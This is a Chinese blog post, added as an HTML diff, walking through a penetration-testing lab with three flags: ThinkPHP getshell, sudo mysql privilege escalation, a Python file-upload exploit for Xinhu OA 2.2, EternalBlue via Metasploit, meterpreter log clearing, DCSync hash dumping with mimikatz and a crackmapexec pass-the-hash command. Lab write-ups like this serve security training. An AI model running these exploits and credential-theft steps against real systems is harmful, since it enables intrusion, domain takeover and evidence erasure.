@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>initial | 红烧花园宝宝</title><meta name="author" content="红烧花园宝宝"><meta name="copyright" content="红烧花园宝宝"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="flag1第一步用tscan扫描指纹发现是thinkphp 然后直接getshell  蚁剑连接后sudo -l发现mysql提权  1sudo mysql -e '\! find / -type f -name &quot;*flag*&quot; 2>/dev/null'  然后得到flag1 1flag{60b53231-    flag2传入fscan来">
+<meta property="og:type" content="article">
+<meta property="og:title" content="initial">
+<meta property="og:url" content="https://lxu2n.github.io/posts/be271daf/index.html">
+<meta property="og:site_name" content="红烧花园宝宝">
+<meta property="og:description" content="flag1第一步用tscan扫描指纹发现是thinkphp 然后直接getshell  蚁剑连接后sudo -l发现mysql提权  1sudo mysql -e '\! find / -type f -name &quot;*flag*&quot; 2>/dev/null'  然后得到flag1 1flag{60b53231-    flag2传入fscan来">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lxu2n.github.io/image/1.png">
+<meta property="article:published_time" content="2025-11-13T11:56:33.000Z">
+<meta property="article:modified_time" content="2025-11-13T11:57:51.469Z">
+<meta property="article:author" content="红烧花园宝宝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lxu2n.github.io/image/1.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "initial",
+  "url": "https://lxu2n.github.io/posts/be271daf/",
+  "image": "https://lxu2n.github.io/image/1.png",
+  "datePublished": "2025-11-13T11:56:33.000Z",
+  "dateModified": "2025-11-13T11:57:51.469Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "红烧花园宝宝",
+      "url": "https://lxu2n.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/6.png"><link rel="canonical" href="https://lxu2n.github.io/posts/be271daf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'initial',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script></head><body><canvas id="bubble_canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:none"></canvas><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/styles/main.css"><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><meta name="generator" content="Hexo 7.3.0"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://lxu2n.github.io/image/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/6.png" alt="Logo"><span class="site-name">红烧花园宝宝</span></a><a class="nav-page-title" href="/"><span class="site-name">initial</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">initial</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-13T11:56:33.000Z" title="发表于 2025-11-13 19:56:33">2025-11-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-13T11:57:51.469Z" title="更新于 2025-11-13 19:57:51">2025-11-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/src/">src</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/src/%E6%89%93%E9%9D%B6/">打靶</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>第一步用tscan扫描指纹发现是thinkphp</p>
+<p>然后直接getshell</p>
+<p><img src="/posts/be271daf/1763030292648-41c97f16-6423-4f28-b9b4-ec077dd92ff7.png" alt="img"></p>
+<p>蚁剑连接后<code>sudo -l</code>发现mysql提权</p>
+<p><img src="/posts/be271daf/1763030327476-35a1fbe8-d9e3-48b2-9c2d-73b2f1bc1c81.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e '\! find / -type f -name "*flag*" 2&gt;/dev/null'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后得到flag1</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{60b53231-</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>传入fscan来扫描一下内网</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后用stowaway做一个内网穿透</p>
+<p><img src="/posts/be271daf/1763030466924-7c488bd8-b12a-45b9-8d03-a508a607ac36.png" alt="img"></p>
+<p>弱口令可以进入到这里</p>
+<p>然后是信呼协同办公2.2版本的文件上传</p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = 'http://url/'</span><br><span class="line">url1 = url_pre + '?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953'</span><br><span class="line">url2 = url_pre + '/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913'</span><br><span class="line">url3 = url_pre + '/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11'</span><br><span class="line"></span><br><span class="line">data1 = {</span><br><span class="line">    'rempass': '0',</span><br><span class="line">    'jmpass': 'false',</span><br><span class="line">    'device': '1625884034525',</span><br><span class="line">    'ltype': '0',</span><br><span class="line">    'adminuser': 'dGVzdA::',</span><br><span class="line">    'adminpass': 'YWJjMTIz',</span><br><span class="line">    'yanzm': ''</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files={'file': open('1.php', 'r+')})</span><br><span class="line"></span><br><span class="line">filepath = str(r.json()['filepath'])</span><br><span class="line">filepath = "/" + filepath.split('.uptemp')[0] + '.php'</span><br><span class="line">id = r.json()['id']</span><br><span class="line"></span><br><span class="line">url3 = url_pre + f'/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid={id}'</span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + "?1=system('whoami');")</span><br><span class="line">print(r.text)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>记得改账户密码</p>
+<p><img src="/posts/be271daf/1763032352601-b78c38f0-cc53-4414-9f93-cd22731d7f4f.png" alt="img"></p>
+<p>蚁剑连接上，查看flag2</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2ce3-4813-87d4-</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><img src="/posts/be271daf/1763033501282-09189c88-7265-4a35-b0d5-9303c53f9bbc.png" alt="img"></p>
+<p>我们可以试一下永恒之蓝</p>
+<p>配置好kali的代理</p>
+<p>启动msf</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br></pre></td></tr></tbody></table></figure>
+
+<p>选好模块，配置好ip进行攻击</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/posts/be271daf/1763033870150-8c136c59-c856-4311-be23-d6687aef813b.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot # 捕获屏幕</span><br><span class="line">meterpreter &gt; upload hello.txt c:// #上传文件</span><br><span class="line">meterpreter &gt; download d://1.txt # 下载文件</span><br><span class="line">meterpreter &gt; shell # 获取cmd</span><br><span class="line">meterpreter &gt; clearev # 清除日志</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里是一些命令</p>
+<p>但是这里没有flag，还有一个可利用的点就是</p>
+<p><img src="/posts/be271daf/1763034191041-7e2ae01c-b7db-4917-bd4c-587e32525ecf.png" alt="img"></p>
+<p>这里有一个dc的域控制器，需要打DCSync</p>
+<p>这里直接贴一位佬的介绍了</p>
+<p><img src="/posts/be271daf/1763034294501-4a1d9fda-6b6b-4eaa-a692-dd65b5a7f174.png" alt="img"><img src="/posts/be271daf/1763034459993-bf664c0b-450f-4174-8e66-db8f54eef974.png" alt="img"></p>
+<p>这里我们符合条件打dcsync，输入一下命令获取用户的hash</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi  # 调用mimikatz模块</span><br><span class="line">kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit  # 导出域内所有用户的信息(包括哈希值)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/posts/be271daf/1763034576733-c415664b-8055-45e1-9a20-16236df7358c.png" alt="img"></p>
+<p>获取到用户的hash</p>
+<p>接下来我们需要使用crackmapexec来进行哈希传递攻击，从而实现在dc域控上的任意命令执行来获得flag3</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/posts/be271daf/1763034800871-2fc3e88f-20d3-4e95-a5d7-15aac8e6cfbb.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html">https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/index.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io">红烧花园宝宝</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io/posts/be271daf/">https://lxu2n.github.io/posts/be271daf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lxu2n.github.io" target="_blank">红烧花园宝宝</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/b320f10d/" title="udf提权"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">udf提权</div></div><div class="info-2"><div class="info-item-1">学习文章：https://www.sqlsec.com/2020/11/mysql.html#UDF-%E6%8F%90%E6%9D%83 基本概念：自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。 复现动态连接库如果是MySQL &gt;= 5.1的版本，必须把UDF的动态链接库文件放置于Mysql安装目录下的lib\plugin文件夹下才能创建自定义函数， sqlmap和Metasploit里都自带了对应系统的动态链接库文件  sqlmap的UDF动态链接库文件位置  1/usr/share/sqlmap/data/udf/mysql   sqlmap自带的udf动态链接库因为防止被误杀，都带着编码，不过它也给出了编码工具 cloak.py   1234567891011121314pwd                                                               /usr/s...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">红烧花园宝宝</div><div class="author-info-description">生命只有一次,我只能爱你一世</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LXu2n/LXu2n.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">3.</span> <span class="toc-text">flag3</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/be271daf/" title="initial">initial</a><time datetime="2025-11-13T11:56:33.000Z" title="发表于 2025-11-13 19:56:33">2025-11-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b320f10d/" title="udf提权">udf提权</a><time datetime="2025-11-13T07:04:30.000Z" title="发表于 2025-11-13 15:04:30">2025-11-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b5e7950d/" title="NSSCTF秋季新生赛">NSSCTF秋季新生赛</a><time datetime="2025-11-12T06:42:59.000Z" title="发表于 2025-11-12 14:42:59">2025-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/77e9ffe8/" title="cc链7">cc链7</a><time datetime="2025-11-04T12:22:01.000Z" title="发表于 2025-11-04 20:22:01">2025-11-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/eee0ae52/" title="cc链4">cc链4</a><time datetime="2025-11-04T12:20:21.000Z" title="发表于 2025-11-04 20:20:21">2025-11-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©2025 By 红烧花园宝宝</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script defer="" src="/js/bubble.js"></script><script src="/styles/fish.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
